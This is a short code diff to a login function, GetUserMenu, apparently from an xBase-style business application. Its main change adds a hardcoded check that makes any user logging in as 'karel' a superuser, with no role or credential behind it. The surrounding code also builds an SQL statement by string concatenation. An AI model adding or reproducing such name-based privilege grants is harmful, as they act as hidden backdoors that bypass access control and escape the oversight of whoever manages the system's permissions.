@@ -178,6 +178,9 @@ FUNCTION GetUserMenu(cUserName as string) as logic
 			LOGON_EMP_ID:=cUser
 			MYEMPID := Str(oEmp:EmpId,-1)
 			UserType:=Transform(oEmp:mTYPE,"")
+			if Lower(LOGON_EMP_ID)=='karel'
+				SUPERUSER:=true
+			endif
 			aMenu:=InitMenu(oEmp:EmpId,UserType) 
 			// record login date and set user online: 
 			InitSystemMenu()
@@ -198,7 +201,7 @@ FUNCTION GetUserMenu(cUserName as string) as logic
 			else
 				FirstLogin:=false
 			endif
-			oEmp:Close()
+			oEmp:Close() 
 			oStmt:=SQLStatement{"update employee set online='1',lstlogin='"+SQLdate(Today())+" "+Time24()+"' where empid='"+MYEMPID+"'",oConn}
 			oStmt:Execute()
 		ENDIF
